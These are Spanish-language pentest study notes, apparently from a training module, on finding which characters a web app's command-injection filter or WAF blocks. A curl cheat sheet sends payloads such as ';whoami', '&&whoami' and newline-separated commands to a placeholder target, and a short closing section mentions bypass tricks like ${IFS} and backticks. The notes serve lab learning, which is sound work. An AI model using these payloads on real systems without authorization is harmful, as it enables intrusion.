---
tags:
  - bypass
  - webapp
  - commandinjection
  - RCE
---
## Conceptos Clave (TL;DR)

- Los filtros de back-end funcionan comparando el input del usuario contra una **blacklist de caracteres y/o comandos**; si hay match, la request es denegada con un mensaje genérico (ej. "Invalid input").
- Un **WAF** opera a nivel de red/HTTP y suele responder con una página de error diferente que puede exponer la IP del atacante o el request bloqueado; un error inline en la app indica filtrado a nivel de código (PHP, etc.).
- La técnica de identificación consiste en **reducción binaria**: enviar el payload original carácter a carácter hasta aislar qué elemento específico activa el bloqueo (caracter operador, espacio, nombre del comando).
- Los operadores de inyección clásicos (`;`, `&&`, `||`, `&`, `|`) son los **primeros candidatos a estar blacklisteados**; hay que probarlos individualmente antes de intentar bypass.

## Herramientas Clave

| Herramienta | Proposito en este vector |
|---|---|
| Burp Suite / curl | Interceptar y modificar requests HTTP para testear payloads caracter a caracter |
| Browser DevTools (Network) | Observar el request raw y la respuesta para distinguir error de app vs. error de WAF |

## Metodologia Paso a Paso

### Fase 1 - Distinguir filtro de aplicacion vs. WAF

Antes de intentar cualquier bypass, determinar con qué tipo de control se está lidiando.

- **Filtro de aplicacion (back-end code):** El error aparece *dentro* de la pagina, en el mismo campo de output de la aplicacion.
- **WAF:** El error redirige a una *pagina diferente* que suele mostrar informacion del request bloqueado (IP de origen, URI, etc.).

### Fase 2 - Aislar el elemento bloqueado

Enviar el payload base que se sabe funciona (ej. una IP valida) e ir agregando componentes uno a uno:

1. Confirmar que el payload base funciona: `<TARGET_IP>`
2. Agregar el operador de inyeccion: `<TARGET_IP>;`
3. Si es bloqueado, el operador (`;`) esta en la blacklist.
4. Si no es bloqueado, agregar el espacio: `<TARGET_IP>; `
5. Si no es bloqueado, agregar el comando: `<TARGET_IP>; whoami`

El objetivo es encontrar el **minimo payload bloqueado** para saber exactamente qué filtrar o bypassear.

### Fase 3 - Probar todos los operadores de inyeccion

Una vez confirmado que un operador especifico esta bloqueado, probar los alternativos para encontrar uno que no lo este:

| Operador | Logica de ejecucion |
|---|---|
| `;` | Ejecuta el segundo comando siempre |
| `&&` | Ejecuta el segundo solo si el primero tiene exito |
| `\|\|` | Ejecuta el segundo solo si el primero falla |
| `&` | Ejecuta ambos en paralelo (background) |
| `\n` / `%0a` | Newline como separador de comandos (comun en filtros mal configurados) |

## Cheat Sheet de Comandos

```bash
# Paso 1: Confirmar que el payload base (IP limpia) NO esta bloqueado
# Esto establece la linea base de comportamiento normal
curl -s -X POST http://<TARGET_IP>/index.php --data "ip=<KNOWN_GOOD_IP>"
```

```bash
# Paso 2: Agregar el operador sospechoso para confirmar que ESTE es el caracter bloqueado
# El %3b es la codificacion URL del caracter ";"
curl -s -X POST http://<TARGET_IP>/index.php --data "ip=<KNOWN_GOOD_IP>%3b"
```

```bash
# Paso 3: Probar el payload completo para ver si el bloqueo es por operador, espacio o comando
# Separar en pasos individuales: primero operador, luego espacio, luego comando
curl -s -X POST http://<TARGET_IP>/index.php --data "ip=<KNOWN_GOOD_IP>%3b+whoami"
```

```bash
# Paso 4: Probar operadores alternativos si ";" esta bloqueado
# Probar "&&" (AND logico)
curl -s -X POST http://<TARGET_IP>/index.php --data "ip=<KNOWN_GOOD_IP>%26%26whoami"

# Probar "||" (OR logico) - util si el primer comando falla
curl -s -X POST http://<TARGET_IP>/index.php --data "ip=<KNOWN_GOOD_IP_INVALIDA>%7c%7cwhoami"

# Probar newline como separador (%0a es URL-encode de \n)
curl -s -X POST http://<TARGET_IP>/index.php --data "ip=<KNOWN_GOOD_IP>%0awhoami"
```

```php
// Referencia: logica tipica de un filtro de blacklist en PHP
// Sirve para entender QUE buscar en code review o para anticipar el patron del filtro
$blacklist = ['&', '|', ';', ' ', 'whoami', ...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

## "Gotchas" y Troubleshooting

- **Diferencia critica de diagnostico:** Un error inline en la app = codigo PHP/app bloqueando. Una pagina de error separada con tu IP = WAF externo bloqueando. El approach de bypass es diferente en cada caso.
- **El espacio tambien puede estar blacklisteado:** No asumir que solo los operadores (`;`, `&`, `|`) estan filtrados. El caracter espacio es un candidato frecuente en blacklists. Testearlo de forma independiente.
- **Reducir el payload a la minima expresion bloqueada** antes de intentar bypass evita perder tiempo con tecnicas que no aplican al caracter correcto.
- **Los operadores no son equivalentes en logica:** Si usas `||`, el comando de inyeccion solo se ejecuta si el primer comando *falla*. Si testeas contra una IP real que responde, el `||` no ejecutara el payload. Usar una IP invalida como base para testear `||`.
- **URL encoding es tu amigo al testear:** Algunos caracteres especiales deben ir URL-encoded en el body del POST para que el servidor los interprete correctamente. Verificar la codificacion si el behavior es inesperado.
- **El modulo menciona solo la deteccion, no el bypass completo:** Esta fase es de reconocimiento del filtro. El bypass real (ej. substitucion de espacios con `${IFS}`, uso de backticks, codificacion de comandos) es el siguiente paso una vez identificado el elemento bloqueado.